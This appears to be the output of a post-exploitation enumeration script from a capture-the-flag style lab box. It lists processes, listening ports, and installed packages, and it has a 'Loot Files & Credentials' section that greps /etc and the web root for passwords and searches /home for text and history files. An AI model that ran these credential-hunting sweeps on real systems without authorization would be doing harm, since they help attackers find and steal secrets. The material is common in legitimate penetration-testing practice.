cmeeks     97131   97066  0 22:04 pts/2    00:00:00 ps -ef

[+] ss -tulwn
$ ss -tulwn 2>/dev/null
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  
icmp6   UNCONN   0        0                      *:58                   *:*     
udp     UNCONN   0        0                0.0.0.0:5355           0.0.0.0:*     
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*     
udp     UNCONN   0        0                   [::]:5355              [::]:*     
tcp     LISTEN   0        128              0.0.0.0:18000          0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:50000          0.0.0.0:*     
tcp     LISTEN   0        32               0.0.0.0:21             0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     
tcp     LISTEN   0        128            127.0.0.1:5432           0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:445            0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:5355           0.0.0.0:*     
tcp     LISTEN   0        50               0.0.0.0:139            0.0.0.0:*     
tcp     LISTEN   0        128                    *:80                   *:*     
tcp     LISTEN   0        128                 [::]:22                [::]:*     
tcp     LISTEN   0        50                  [::]:445               [::]:*     
tcp     LISTEN   0        128                 [::]:5355              [::]:*     
tcp     LISTEN   0        50                  [::]:139               [::]:*     

[+] netstat -tulnp
$ netstat -tulnp 2>/dev/null
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:18000           0.0.0.0:*               LISTEN      1391/puma 4.3.6 (tc 
tcp        0      0 0.0.0.0:50000           0.0.0.0:*               LISTEN      1392/python3.6      
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:5355            0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp6       0      0 :::5355                 :::*                                -                   


```

7.  Software / Packages

```
+] rpm -qa (first 200)
$ rpm -qa 2>/dev/null | head -n 200
python3-nftables-0.9.3-12.el8_2.1.x86_64
crontabs-1.11-16.20150630git.el8.noarch
python3-setuptools-wheel-39.2.0-5.el8.noarch
grub2-tools-efi-2.02-87.el8_2.x86_64
libstoragemgmt-1.8.3-1.el8.x86_64
python3-syspurpose-1.26.20-1.el8_2.x86_64
efi-filesystem-3-2.el8.noarch
kpartx-0.8.3-3.el8_2.3.x86_64
python3-libxml2-2.9.7-7.el8.x86_64
publicsuffix-list-dafsa-20180723-1.el8.noarch
libtool-ltdl-2.4.6-25.el8.x86_64
gnupg2-smime-2.2.9-1.el8.x86_64
libselinux-2.9-3.el8.x86_64
libdrm-2.4.100-1.el8.x86_64
glibc-2.28-101.el8.x86_64
open-vm-tools-11.0.5-3.el8.x86_64
avahi-libs-0.7-19.el8.x86_64
libcom_err-1.45.4-3.el8.x86_64
perl-libs-5.26.3-416.el8.x86_64
python3-rpm-4.14.2-37.el8.x86_64
info-6.5-6.el8.x86_64
perl-parent-0.237-1.el8.noarch
libtalloc-2.2.0-7.el8.x86_64
rubygem-io-console-0.4.6-105.module_el8.1.0+214+9be47fd7.x86_64
device-mapper-event-1.02.169-3.el8.x86_64
readline-7.0-10.el8.x86_64
rubygem-rdoc-6.0.1-105.module_el8.1.0+214+9be47fd7.noarch
python3-configobj-5.0.6-11.el8.noarch
pcre-8.42-4.el8.x86_64
libmpc-1.0.2-9.el8.x86_64
authselect-libs-1.1-2.el8.x86_64
libcollection-0.7.0-39.el8.x86_64
perl-macros-5.26.3-416.el8.x86_64
python3-dbus-1.2.4-15.el8.x86_64
sqlite-libs-3.26.0-6.el8.x86_64
perl-Unicode-Normalize-1.25-396.el8.x86_64
glib-networking-2.56.1-1.1.el8.x86_64
libacl-2.2.53-1.el8.x86_64
perl-constant-1.33-396.el8.noarch
fipscheck-lib-1.5.0-4.el8.x86_64
libzstd-1.4.2-2.el8.x86_64
perl-MIME-Base64-3.15-396.el8.x86_64
rpm-plugin-systemd-inhibit-4.14.2-37.el8.x86_64
libffi-3.1-21.el8.x86_64
perl-Digest-1.17-395.el8.noarch
libgcrypt-1.8.3-4.el8.x86_64
perl-Pod-Escapes-1.07-395.el8.noarch
python3-slip-dbus-0.6.4-11.el8.noarch
findutils-4.6.0-20.el8.x86_64
perl-Mozilla-CA-20160104-7.el8.noarch
python3-pyyaml-3.12-12.el8.x86_64
libaio-0.3.112-1.el8.x86_64
perl-podlators-4.11-1.el8.noarch
virt-what-1.18-6.el8.x86_64
which-2.21-12.el8.x86_64
perl-IO-Socket-SSL-2.066-4.el8.noarch
dhcp-libs-4.3.6-40.el8.x86_64
libtasn1-4.13-3.el8.x86_64
pcre2-utf32-10.32-1.el8.x86_64
binutils-2.30-73.el8.x86_64
libnftnl-1.1.5-4.el8.x86_64
ncurses-devel-6.1-7.20180224.el8.x86_64
samba-common-4.11.2-13.el8.noarch
diffutils-3.6-6.el8.x86_64
libkadm5-1.17-18.el8.x86_64
libsmbclient-4.11.2-13.el8.x86_64
libedit-3.1-23.20170329cvs.el8.x86_64
emacs-filesystem-26.1-5.el8.noarch
libnfsidmap-2.3.3-31.el8.x86_64
isl-0.16.1-6.el8.x86_64
sssd-common-pac-2.2.3-20.el8.x86_64
lzo-2.08-14.el8.x86_64
openssl-devel-1.1.1c-15.el8.x86_64
sssd-ldap-2.2.3-20.el8.x86_64
patch-2.7.6-11.el8.x86_64
realmd-0.16.3-18.el8.x86_64
device-mapper-persistent-data-0.8.5-3.el8.x86_64
postgresql-10.14-1.module_el8.2.0+487+53cc39ce.x86_64
xfsdump-3.1.8-2.el8.x86_64
ipset-7.1-1.el8.x86_64
python3-pip-9.0.3-16.el8.noarch
acl-2.2.53-1.el8.x86_64
nodejs-10.23.0-1nodesource.x86_64
openssh-server-8.0p1-4.el8_1.x86_64
libcomps-0.1.11-4.el8.x86_64
samba-common-tools-4.11.2-13.el8.x86_64
rpm-sign-4.14.2-37.el8.x86_64
libproxy-0.4.15-5.2.el8.x86_64
apr-util-openssl-1.6.1-6.el8.x86_64
unzip-6.0-43.el8.x86_64
httpd-filesystem-2.4.37-21.module_el8.2.0+494+1df74eae.noarch
at-3.1.20-11.el8.x86_64
freetype-2.9.1-4.el8.x86_64
git-core-2.18.4-2.el8_2.x86_64
mlocate-0.26-20.el8.x86_64
less-530-1.el8.x86_64
perl-Error-0.17025-2.el8.noarch
smartmontools-6.6-3.el8.x86_64
dmidecode-3.2-5.el8.x86_64
nmap-ncat-7.70-5.el8.x86_64
dracut-config-rescue-049-70.git20200228.el8.x86_64
ipcalc-0.2.4-4.el8.x86_64
e2fsprogs-1.45.4-3.el8.x86_64
libpath_utils-0.2.1-39.el8.x86_64
lsof-4.91-2.el8.x86_64
pkgconf-1.4.2-1.el8.x86_64
bash-completion-2.7-5.el8.noarch
libsss_autofs-2.2.3-20.el8.x86_64
biosdevname-0.7.3-2.el8.x86_64
libverto-0.3.0-5.el8.x86_64
tar-1.30-4.el8.x86_64
newt-0.52.20-11.el8.x86_64
ed-1.14.2-4.el8.x86_64
glibc-headers-2.28-101.el8.x86_64
hostname-3.20-6.el8.x86_64
kbd-legacy-2.0.4-8.el8.noarch
mtr-0.92-3.el8.x86_64
cyrus-sasl-lib-2.1.27-1.el8.x86_64
rootfiles-8.1-22.el8.noarch
libkcapi-1.1.1-16_1.el8.x86_64
iwl6050-firmware-41.28.5.1-97.el8.1.noarch
curl-7.61.1-12.el8.x86_64
iwl5000-firmware-8.83.5.1_1-97.el8.1.noarch
gzip-1.9-9.el8.x86_64
iwl2030-firmware-18.168.6.1-97.el8.1.noarch
krb5-libs-1.17-18.el8.x86_64
iwl1000-firmware-39.31.5.1-97.el8.1.noarch
device-mapper-1.02.169-3.el8.x86_64
gnutls-3.6.8-11.el8_2.x86_64
python3-libs-3.6.8-23.el8.x86_64
libdnf-0.39.1-6.el8_2.x86_64
grub2-tools-2.02-87.el8_2.x86_64
nftables-0.9.3-12.el8_2.1.x86_64
shadow-utils-4.6-8.el8.x86_64
dnf-data-4.2.17-7.el8_2.noarch
libutempter-1.1.6-14.el8.x86_64
systemd-libs-239-31.el8_2.2.x86_64
libpwquality-1.4.0-9.el8.x86_64
dbus-daemon-1.12.8-10.el8_2.x86_64
os-prober-1.74-6.el8.x86_64
centos-release-8.2-2.2004.0.2.el8.x86_64
platform-python-3.6.8-23.el8.x86_64
systemd-pam-239-31.el8_2.2.x86_64
grubby-8.40-38.el8.x86_64
unbound-libs-1.7.3-11.el8_2.x86_64
glib2-2.56.4-8.el8.x86_64
python3-dnf-plugins-core-4.0.12-4.el8_2.noarch
kernel-4.18.0-193.28.1.el8_2.x86_64
libsss_certmap-2.2.3-20.el8.x86_64
NetworkManager-tui-1.22.8-5.el8_2.x86_64
polkit-pkla-compat-0.1-12.el8.x86_64
ca-certificates-2020.2.41-80.0.el8_2.noarch
ima-evm-utils-1.1-5.el8.x86_64
libgcc-8.3.1-5.el8.0.2.x86_64
python3-decorator-4.2.1-2.el8.noarch
cronie-1.5.2-4.el8.x86_64
python3-pip-wheel-9.0.3-16.el8.noarch
iputils-20180629-2.el8.x86_64
python3-libstoragemgmt-clibs-1.8.3-1.el8.x86_64
filesystem-3.8-2.el8.x86_64
json-glib-1.4.4-1.el8.x86_64
basesystem-11-5.el8.noarch
quota-nls-4.04-10.el8.noarch
policycoreutils-2.9-9.el8.x86_64
pkgconf-m4-1.4.2-1.el8.noarch
libxslt-1.1.32-4.el8.x86_64
libusbx-1.0.22-1.el8.x86_64
pcre2-10.32-1.el8.x86_64
xmlsec1-1.2.25-4.el8.x86_64
gnupg2-2.2.9-1.el8.x86_64
ncurses-libs-6.1-7.20180224.el8.x86_64
libpciaccess-0.14-1.el8.x86_64
glibc-common-2.28-101.el8.x86_64
fuse-common-3.2.1-12.el8.x86_64
bash-4.4.19-10.el8.x86_64
libmspack-0.7-0.3.alpha.el8.4.x86_64
rpm-build-libs-4.14.2-37.el8.x86_64
yum-utils-4.0.12-4.el8_2.noarch
cups-libs-2.2.6-33.el8.x86_64
popt-1.16-14.el8.x86_64
perl-Exporter-5.72-396.el8.noarch
adcli-0.8.2-5.el8.x86_64
xz-libs-5.2.4-3.el8.x86_64
perl-Carp-1.42-396.el8.noarch
python3-gpg-1.10.0-6.el8.0.1.x86_64
bzip2-libs-1.0.6-26.el8.x86_64
perl-Scalar-List-Utils-1.49-2.el8.x86_64
libstdc++-8.3.1-5.el8.0.2.x86_64
ruby-irb-2.5.5-105.module_el8.1.0+214+9be47fd7.noarch
python3-dmidecode-3.12.2-15.el8.x86_64
libuuid-2.32.1-22.el8.x86_64
rubygem-did_you_mean-1.2.0-105.module_el8.1.0+214+9be47fd7.noarch
kmod-kvdo-6.2.2.117-65.el8.x86_64
libtevent-0.10.0-2.el8.x86_64
rubygem-json-2.1.0-105.module_el8.1.0+214+9be47fd7.x86_64
lvm2-libs-2.03.08-3.el8.x86_64
libtdb-1.4.2-2.el8.x86_64
rubygem-psych-3.0.2-105.module_el8.1.0+214+9be47fd7.x86_64
timedatex-0.5-3.el8.x86_64
libgpg-error-1.31-1.el8.x86_64


```

8. Loot Files & Credentials

```
g[+] grep password in /etc (first 50)
$ grep -R "password" /etc 2>/dev/null | head -n 50
/etc/pki/tls/openssl.cnf:# input_password = secret
/etc/pki/tls/openssl.cnf:# output_password = secret
/etc/pki/tls/openssl.cnf:challengePassword              = A challenge password
/etc/security/pwquality.conf:# Configuration for systemwide password quality limits
/etc/security/pwquality.conf:# Number of characters in the new password that must not be present in the
/etc/security/pwquality.conf:# old password.
/etc/security/pwquality.conf:# Minimum acceptable size for the new password (plus one if
/etc/security/pwquality.conf:# The maximum credit for having digits in the new password. If less than 0
/etc/security/pwquality.conf:# it is the minimum number of digits in the new password.
/etc/security/pwquality.conf:# The maximum credit for having uppercase characters in the new password.
/etc/security/pwquality.conf:# password.
/etc/security/pwquality.conf:# The maximum credit for having lowercase characters in the new password.
/etc/security/pwquality.conf:# password.
/etc/security/pwquality.conf:# The maximum credit for having other characters in the new password.
/etc/security/pwquality.conf:# password.
/etc/security/pwquality.conf:# password (digits, uppercase, lowercase, others).
/etc/security/pwquality.conf:# The maximum number of allowed consecutive same characters in the new password.
/etc/security/pwquality.conf:# new password.
/etc/security/pwquality.conf:# The new password is rejected if it fails the check and the value is not 0.
/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password(/.*)?  system_u:object_r:systemd_passwd_var_run_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password-block(/.*)?    system_u:object_r:systemd_passwd_var_run_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent  --      system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent      --      system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent    --      system_u:object_r:systemd_passwd_agent_exec_t:s0
/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/system-config-rootpassword/system-config-rootpassword     --      system_u:object_r:bin_t:s0
Binary file /etc/selinux/targeted/contexts/files/file_contexts.bin matches
Binary file /etc/selinux/targeted/policy/policy.31 matches
/etc/pam.d/fingerprint-auth:password    required      pam_deny.so
/etc/pam.d/other:password required       pam_deny.so
/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pam.d/password-auth:password    sufficient    pam_unix.so try_first_pass use_authtok nullok sha512 shadow
/etc/pam.d/password-auth:password    required      pam_deny.so
/etc/pam.d/smartcard-auth:password    optional      pam_pkcs11.so
/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
/etc/pam.d/system-auth:password    sufficient    pam_unix.so try_first_pass use_authtok nullok sha512 shadow
/etc/pam.d/system-auth:password    required      pam_deny.so
/etc/pam.d/login:password   include      system-auth
/etc/pam.d/remote:auth       substack     password-auth
/etc/pam.d/remote:account    include      password-auth
/etc/pam.d/remote:password   include      password-auth
/etc/pam.d/remote:session    include      password-auth
/etc/pam.d/su:password  include         system-auth
/etc/pam.d/su-l:password        include         su
/etc/pam.d/polkit-1:password   include      system-auth
/etc/pam.d/crond:auth       include    password-auth
/etc/pam.d/crond:account    include    password-auth
/etc/pam.d/crond:session    include    password-auth
/etc/pam.d/cockpit:auth       substack     password-auth
/etc/pam.d/cockpit:account    include      password-auth
/etc/pam.d/cockpit:password   include      password-auth

[+] web roots
$ ls -la /var/www 2>/dev/null
total 4
drwxr-xr-x   4 root root   33 Nov 13  2020 .
drwxr-xr-x. 22 root root 4096 Nov 13  2020 ..
drwxr-xr-x   2 root root    6 Sep 15  2020 cgi-bin
drwxr-xr-x   2 root root    6 Sep 15  2020 html

[+] web creds (first 50)
$ grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

[+] text files in /home
$ find /home -type f -name "*.txt" 2>/dev/null
/home/cmeeks/local.txt
/home/cmeeks/.gnupg/crls.d/DIR.txt
/home/cmeeks/.rvm/src/rvm/help/index.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/concurrent-ruby-1.1.7/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/rack-test-1.1.0/MIT-LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/mini_portile2-2.4.0/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/mini_portile2-2.4.0/test/assets/test-cmake-1.0/CMakeLists.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/loofah-2.7.0/MIT-LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/loofah-2.7.0/Manifest.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/mini_mime-1.0.2/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.7.0/gems/railties-6.0.3.4/lib/rails/generators/rails/app/templates/public/robots.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/concurrent-ruby-1.1.7/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/minitest-5.14.2/Manifest.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/mini_portile2-2.4.0/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/mini_portile2-2.4.0/test/assets/test-cmake-1.0/CMakeLists.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/loofah-2.7.0/MIT-LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/loofah-2.7.0/Manifest.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/rack-test-1.1.0/MIT-LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/mini_mime-1.0.2/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/public_suffix-4.0.6/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/public_suffix-4.0.6/data/list.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/public_suffix-4.0.6/test/tests.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/addressable-2.7.0/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/bindex-0.8.1/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/bootsnap-1.5.1/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/capybara-3.33.0/License.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/capybara-3.33.0/lib/capybara/spec/fixtures/another_test_file.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/capybara-3.33.0/lib/capybara/spec/fixtures/test_file.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/rb-fsevent-0.10.4/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/listen-3.3.0/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/pg-1.2.3/Manifest.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/pg-1.2.3/ext/errorcodes.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/railties-6.0.3.4/lib/rails/generators/rails/app/templates/public/robots.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/sassc-2.4.0/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/sassc-rails-2.1.2/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/spring-2.1.1/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/spring-watcher-listen-2.0.1/LICENSE.txt
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/webdrivers-4.4.1/LICENSE.txt
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/gems/2.7.0/gems/net-telnet-0.2.0/LICENSE.txt
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/gems/2.7.0/gems/xmlrpc-0.3.0/LICENSE.txt
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/gems/2.7.0/gems/minitest-5.13.0/Manifest.txt
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/gems/2.6.0/gems/net-telnet-0.2.0/LICENSE.txt
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/gems/2.6.0/gems/minitest-5.11.3/Manifest.txt
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/gems/2.6.0/gems/xmlrpc-0.3.0/LICENSE.txt
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/gems/2.6.0/gems/did_you_mean-1.3.0/LICENSE.txt
/home/cmeeks/.rvm/config/displayed-notes.txt
/home/cmeeks/.rvm/help/index.txt
/home/cmeeks/.cache/yarn/v6/npm-cssesc-3.0.0-37741919903b868565e1c09ea747445cd18983ee-integrity/node_modules/cssesc/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-mkdirp-0.5.5-d91cefd62d1436ca0f41620e251288d420099def-integrity/node_modules/mkdirp/bin/usage.txt
/home/cmeeks/.cache/yarn/v6/npm-chrome-trace-event-1.0.2-234090ee97c7d4ad1a2c4beae27505deffc608a4-integrity/node_modules/chrome-trace-event/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-jsesc-2.5.2-80564d2e483dacf6e8ef209650a67df3f0c283a4-integrity/node_modules/jsesc/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-set-blocking-2.0.0-045f9782d011ae9a6803ddd382b24392b3d890f7-integrity/node_modules/set-blocking/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-performance-now-2.1.0-6309f4e0e5fa913ec1c69307ae364b4b377c9e7b-integrity/node_modules/performance-now/license.txt
/home/cmeeks/.cache/yarn/v6/npm-@webassemblyjs-leb128-1.9.0-f19ca0b76a6dc55623a09cffa769e838fa1e1c95-integrity/node_modules/@webassemblyjs/leb128/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-tslib-1.14.1-cf2d38bdc34a134bcaf1091c41f6619e2f672d00-integrity/node_modules/tslib/CopyrightNotice.txt
/home/cmeeks/.cache/yarn/v6/npm-tslib-1.14.1-cf2d38bdc34a134bcaf1091c41f6619e2f672d00-integrity/node_modules/tslib/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-punycode-1.4.1-c0d5a63b2718800ad8e1eb0fa5269c84dd41845e-integrity/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-stream-http-2.8.3-b2d242469288a5a27ec4fe8933acf623de6514fc-integrity/node_modules/stream-http/test/server/static/basic.txt
/home/cmeeks/.cache/yarn/v6/npm-cliui-5.0.0-deefcfdb2e800784aa34f46fa08e06851c7bbbc5-integrity/node_modules/cliui/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-require-main-filename-2.0.0-d0b329ecc7cc0f61649f62215be69af54aa8989b-integrity/node_modules/require-main-filename/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-yargs-parser-13.1.2-130f09702ebaeef2650d54ce6e3e5706f7a4fb38-integrity/node_modules/yargs-parser/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-regexpu-core-4.7.1-2dea5a9a07233298fbf0db91fa9abc4c6e0f8ad6-integrity/node_modules/regexpu-core/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-signal-exit-3.0.3-a1410c2edd8f077b08b4e253c8eacfcaf057461c-integrity/node_modules/signal-exit/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-punycode-2.1.1-b58b010ac40c22c5657616c8d2c2c02c7bf479ec-integrity/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-cssesc-2.0.0-3b13bd1bb1cb36e1bcb5a4dcd27f54c5dcb35703-integrity/node_modules/cssesc/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-lodash-reinterpolate-3.0.0-0ccf2d89166af03b3663c796538b75ac6e114d9d-integrity/node_modules/lodash._reinterpolate/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-setimmediate-1.0.5-290cbb232e306942d7d7ea9b83732ab7856f8285-integrity/node_modules/setimmediate/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-punycode-1.3.2-9653a036fb7c1ee42342f2325cceefea3926c48d-integrity/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-emoji-regex-7.0.3-933a04052860c85e83c122479c4748a8e4c72156-integrity/node_modules/emoji-regex/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-regenerate-1.4.2-b9346d8827e8f5a32f7ba29637d398b69014848a-integrity/node_modules/regenerate/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-regenerate-unicode-properties-8.2.0-e5de7111d655e7ba60c057dbe9ff37c87e65cdec-integrity/node_modules/regenerate-unicode-properties/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-regjsgen-0.5.2-92ff295fb1deecbf6ecdab2543d207e91aa33733-integrity/node_modules/regjsgen/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-unicode-match-property-ecmascript-1.0.4-8ed2a32569961bce9227d09cd3ffbb8fed5f020c-integrity/node_modules/unicode-match-property-ecmascript/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-unicode-match-property-value-ecmascript-1.2.0-0d91f600eeeb3096aa962b1d6fc88876e64ea531-integrity/node_modules/unicode-match-property-value-ecmascript/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-dashdash-1.14.1-853cfa0f7cbe2fed5de20326b8dd581035f6e2f0-integrity/node_modules/dashdash/LICENSE.txt
/home/cmeeks/.cache/yarn/v6/npm-jsesc-0.5.0-e7dee66e35d6fc16f710fe91d5cf69f70f08911d-integrity/node_modules/jsesc/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-unicode-canonical-property-names-ecmascript-1.0.4-2619800c4c825800efdd8343af7dd9933cbe2818-integrity/node_modules/unicode-canonical-property-names-ecmascript/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-unicode-property-aliases-ecmascript-1.1.0-dd57a99f6207bedff4628abefb94c50db941c8f4-integrity/node_modules/unicode-property-aliases-ecmascript/LICENSE-MIT.txt
/home/cmeeks/.cache/yarn/v6/npm-path-is-inside-1.0.2-365417dede44430d1c11af61027facf074bdfc53-integrity/node_modules/path-is-inside/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/@webassemblyjs/leb128/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/chrome-trace-event/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/cliui/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/cssesc/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/dashdash/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/emoji-regex/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/jsesc/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/lodash._reinterpolate/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/mkdirp/bin/usage.txt
/home/cmeeks/register_hetemit/node_modules/node-libs-browser/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/path-is-inside/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/performance-now/license.txt
/home/cmeeks/register_hetemit/node_modules/postcss-selector-parser/node_modules/cssesc/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/regenerate/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/regenerate-unicode-properties/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/regexpu-core/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/regjsgen/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/regjsparser/node_modules/jsesc/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/require-main-filename/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/set-blocking/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/setimmediate/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/signal-exit/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/stream-http/test/server/static/basic.txt
/home/cmeeks/register_hetemit/node_modules/tslib/CopyrightNotice.txt
/home/cmeeks/register_hetemit/node_modules/tslib/LICENSE.txt
/home/cmeeks/register_hetemit/node_modules/unicode-canonical-property-names-ecmascript/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/unicode-match-property-ecmascript/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/unicode-match-property-value-ecmascript/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/unicode-property-aliases-ecmascript/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/url/node_modules/punycode/LICENSE-MIT.txt
/home/cmeeks/register_hetemit/node_modules/yargs-parser/LICENSE.txt
/home/cmeeks/register_hetemit/public/robots.txt
/home/cmeeks/register_hetemit/tmp/development_secret.txt
/home/cmeeks/register_hetemit/tmp/restart.txt
/home/cmeeks/privesc_2026-01-15_220445.txt

[+] history files in /home
$ find /home -type f -name "*history*" 2>/dev/null
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/thor-1.0.1/ri/Thor/LineEditor/Readline/add_to_history%3f-i.ri
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/sprockets-4.0.2/ri/Sprockets/UnloadedAsset/dependency_history_key-i.ri
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/rake-13.0.1/lib/rake/thread_history_display.rb
/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/byebug-11.1.3/lib/byebug/commands/history.rb
